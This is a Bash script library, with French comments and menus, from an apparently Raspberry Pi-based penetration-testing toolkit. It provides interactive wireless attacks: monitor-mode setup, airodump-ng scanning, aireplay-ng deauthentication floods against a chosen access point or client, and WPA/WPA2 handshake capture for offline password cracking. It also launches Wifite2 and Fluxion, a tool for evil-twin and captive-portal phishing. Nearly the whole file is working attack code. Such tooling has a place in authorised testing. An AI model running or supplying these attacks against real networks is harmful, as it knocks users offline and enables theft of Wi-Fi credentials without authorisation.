#!/bin/bash

# Bibliothèque pour toutes les fonctions liées aux attaques et à l'analyse sans fil (Wi-Fi, Bluetooth, SDR, etc.).

# --- FONCTIONS DE MENU ---

# Menu principal pour la sécurité sans fil.
wireless_security_menu() {
    while true; do
        clear
        show_fox
        echo -e "${CYAN}📶 WIRELESS ATTACKS${NC}"
        echo "====================="
        
        echo -e "${GREEN}[1]${NC} 📡 Gestion du Mode Moniteur"
        echo -e "${GREEN}[2]${NC} 🔍 Scan des Réseaux WiFi (airodump)"
        echo -e "${GREEN}[3]${NC} 💥 Attaque de Désauthentification"
        echo -e "${GREEN}[4]${NC} 🔐 Capture de Handshake WPA/WPA2"
        echo -e "${GREEN}[5]${NC}  🤖 Wifite2 (Attaque WiFi Automatisée)"
        echo -e "${GREEN}[6]${NC} 🌊 Fluxion (Attaques MiTM & Captive Portal)"

        # Affiche des menus contextuels si le matériel correspondant est détecté
        local next_option=7
        local sdr_option="" bluetooth_option="" rfid_option=""

        if [[ "${HAS_RTLSDR:-false}" == "true" || "${HAS_HACKRF:-false}" == "true" ]]; then
            echo -e "${GREEN}[${next_option}]${NC} 📻 Analyse Radio (SDR)"
            sdr_option=$next_option
            next_option=$((next_option+1))
        fi
        if [[ "${HAS_BLUETOOTH:-false}" == "true" ]]; then
            echo -e "${GREEN}[${next_option}]${NC} 🔵 Analyse Bluetooth"
            bluetooth_option=$next_option
            next_option=$((next_option+1))
        fi
        if [[ "${HAS_PROXMARK3:-false}" == "true" ]]; then
            echo -e "${GREEN}[${next_option}]${NC} 💳 Analyse RFID/NFC (Proxmark3)"
            rfid_option=$next_option
            next_option=$((next_option+1))
        fi

        echo ""
        echo -e "${RED}[0]${NC}  ⬅️  Retour au menu principal"
        echo ""
        echo -n -e "${YELLOW}🦊 Votre choix: ${NC}"
        
        local choice
        read -r choice
        
        case "$choice" in
            1) setup_monitor_mode ;;
            2) scan_wifi_networks ;;
            3) deauth_attack ;;
            4) capture_handshake ;;
            5) run_wifite2 ;;
            6) run_fluxion ;;
            0) return ;;
            *) 
                # Gestion des options de menu dynamiques
                if [[ -n "$sdr_option" && "$choice" == "$sdr_option" ]]; then
                    sdr_analysis_menu
                elif [[ -n "$bluetooth_option" && "$choice" == "$bluetooth_option" ]]; then
                    bluetooth_analysis_menu
                elif [[ -n "$rfid_option" && "$choice" == "$rfid_option" ]]; then
                    rfid_analysis_menu
                else
                    echo -e "${RED}❌ Option invalide${NC}"
                    sleep 1
                fi
                ;; 
        esac
    done
}

# --- FONCTIONS WIFI (AIRCRACK-NG & AUTRES) ---

run_wifite2() {
    local wifite_path="${SCRIPT_DIR}/../tools/wifite2/Wifite.py"
    if [[ ! -f "$wifite_path" ]]; then echo -e "${RED}❌ Wifite2 non trouvé !${NC}"; sleep 2; return; fi
    clear
    echo -e "${CYAN}🚀 Lancement de Wifite2...${NC}"
    sudo python3 "$wifite_path"
    press_enter_to_continue
}

run_fluxion() {
    local fluxion_path="${SCRIPT_DIR}/../tools/fluxion/fluxion.sh"
    if [[ ! -f "$fluxion_path" ]]; then echo -e "${RED}❌ Fluxion non trouvé !${NC}"; sleep 2; return; fi
    clear
    echo -e "${CYAN}🚀 Lancement de Fluxion...${NC}"
    # Fluxion a besoin d'être lancé depuis son propre répertoire
    (cd "$(dirname "$fluxion_path")" && sudo bash fluxion.sh)
    press_enter_to_continue
}

run_kismet() {
    if ! command -v kismet &>/dev/null; then
        echo -e "${RED}❌ Kismet n'est pas installé.${NC}"
        read -r -p "Installer Kismet? (y/N): " confirm
        if [[ "$confirm" =~ ^[Yy]$ ]]; then
            echo -e "${YELLOW}📦 Installation de Kismet...${NC}"
            sudo apt update && sudo apt install kismet -y
        fi
        return
    fi
    clear
    echo -e "${CYAN}🚀 Lancement de Kismet...${NC}"
    echo -e "${YELLOW}💡 Accédez à l'interface web de Kismet (généralement http://localhost:2501) depuis votre navigateur.${NC}"
    sudo kismet
    press_enter_to_continue
}

# --- CORE WIFI ATTACK FUNCTIONS ---

# Helper to select a wireless interface
select_wireless_interface() {
    selected_interface=""
    echo -e "${CYAN}🔍 Détection des interfaces sans fil...${NC}"
    # Grep for wireless interfaces (wlan, wlx, etc.)
    # Updated to handle cases where iwconfig is not installed or no interfaces are found
    if ! command -v iwconfig &> /dev/null; then
        echo -e "${RED}❌ La commande 'iwconfig' n'est pas trouvée. Installez les 'wireless-tools'.${NC}"
        press_enter_to_continue
        return 1
    fi
    local interface_array=()
    mapfile -t interface_array < <(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*')
    if [ ${#interface_array[@]} -eq 0 ]; then
        echo -e "${RED}❌ Aucune interface sans fil trouvée.${NC}"
        echo -e "${YELLOW}💡 Assurez-vous que votre adaptateur est connecté.${NC}"
        press_enter_to_continue
        return 1
    fi

    echo -e "${BLUE}Interfaces disponibles:${NC}"
    local i=1
    for iface in "${interface_array[@]}"; do
        local mode
        mode=$(iwconfig "$iface" 2>/dev/null | grep -o 'Mode:[^ ]*' | cut -d: -f2)
        printf "  ${GREEN}[%d]${NC} %-10s (Mode: %s)\n" "$i" "$iface" "$mode"
        i=$((i+1))
    done

    read -r -p "🦊 Votre choix: " choice
    if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#interface_array[@]} ]; then
        echo -e "${RED}❌ Choix invalide.${NC}"; sleep 2; return 1
    fi
    selected_interface=${interface_array[$((choice-1))]}
    echo -e "${GREEN}✅ Interface sélectionnée: $selected_interface${NC}"
    sleep 1
    return 0
}

# Function to setup monitor mode
setup_monitor_mode() {
    select_wireless_interface || return
    local interface=$selected_interface

    echo -e "${YELLOW}Activation du mode moniteur sur $interface...${NC}"
    # Stop network managers that could interfere
    sudo airmon-ng check kill >/dev/null 2>&1
    # Start monitor mode
    sudo airmon-ng start "$interface"
    echo -e "${GREEN}✅ Mode moniteur activé.${NC}"
    echo -e "${YELLOW}💡 Une nouvelle interface (ex: wlan0mon) a peut-être été créée. Utilisez-la pour les scans.${NC}"
    press_enter_to_continue
}

# Function to scan for WiFi networks
scan_wifi_networks() {
    select_wireless_interface || return
    local interface=$selected_interface
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}❌ L'interface $interface n'est pas en mode moniteur.${NC}"
        echo -e "${YELLOW}💡 Veuillez d'abord activer le mode moniteur (Option 1).${NC}"
        press_enter_to_continue
        return
    fi

    echo -e "${CYAN}🚀 Lancement du scan avec airodump-ng sur $interface...${NC}"
    echo -e "${YELLOW}Appuyez sur Ctrl+C pour arrêter le scan.${NC}"
    sleep 2
    trap '' SIGINT # Temporarily disable exit trap
    sudo airodump-ng "$interface"
    trap cleanup_exit SIGINT SIGTERM # Re-enable exit trap
    press_enter_to_continue
}

# Function for deauthentication attack
deauth_attack() {
    select_wireless_interface || return
    local interface=$selected_interface
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}❌ L'interface $interface n'est pas en mode moniteur.${NC}"; press_enter_to_continue; return
    fi

    read -r -p "Entrez le BSSID de la cible (ex: 00:11:22:33:44:55): " bssid
    if [ -z "$bssid" ]; then echo -e "${RED}BSSID requis.${NC}"; sleep 2; return; fi

    read -r -p "Entrez l'adresse MAC du client (laissez vide pour tous les clients): " client_mac

    local deauth_count=10
    read -r -p "Nombre de paquets deauth à envoyer [défaut: $deauth_count]: " user_count
    if [[ "$user_count" =~ ^[0-9]+$ ]]; then deauth_count=$user_count; fi

    echo -e "${RED}💥 Lancement de l'attaque de désauthentification sur $bssid...${NC}"
    if [ -z "$client_mac" ]; then
        sudo aireplay-ng --deauth "$deauth_count" -a "$bssid" "$interface"
    else
        sudo aireplay-ng --deauth "$deauth_count" -a "$bssid" -c "$client_mac" "$interface"
    fi
    echo -e "${GREEN}✅ Attaque terminée.${NC}"
    press_enter_to_continue
}

# Function to capture WPA/WPA2 handshake
capture_handshake() {
    select_wireless_interface || return
    local interface=$selected_interface
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}❌ L'interface $interface n'est pas en mode moniteur.${NC}"; press_enter_to_continue; return
    fi

    read -r -p "Entrez le BSSID de la cible: " bssid
    if [ -z "$bssid" ]; then echo -e "${RED}BSSID requis.${NC}"; sleep 2; return; fi

    read -r -p "Entrez le canal (channel) de la cible: " channel
    if ! [[ "$channel" =~ ^[0-9]+$ ]]; then echo -e "${RED}Canal invalide.${NC}"; sleep 2; return; fi

    local output_dir="$PIHACK_OUTPUT_PATH/handshakes"
    mkdir -p "$output_dir"
    local output_file
    output_file="$output_dir/handshake_$(echo "$bssid" | tr -d ':')_$(date +%Y%m%d_%H%M%S)"

    echo -e "${CYAN}🚀 Lancement de la capture sur le canal $channel pour le BSSID $bssid...${NC}"
    echo -e "${YELLOW}Les fichiers seront sauvegardés avec le préfixe: $output_file${NC}"
    echo -e "${YELLOW}Attendez qu'un 'WPA handshake' apparaisse en haut à droite de l'écran d'airodump.${NC}"
    echo -e "${YELLOW}Une fois capturé, vous pouvez arrêter avec Ctrl+C.${NC}"
    sleep 4

    trap '' SIGINT
    sudo airodump-ng --bssid "$bssid" --channel "$channel" --write "$output_file" "$interface"
    trap cleanup_exit SIGINT SIGTERM

    echo -e "${GREEN}✅ Capture terminée.${NC}"
    echo -e "${YELLOW}💡 Vous pouvez maintenant essayer de cracker le handshake avec Hashcat ou John the Ripper.${NC}"
    press_enter_to_continue
}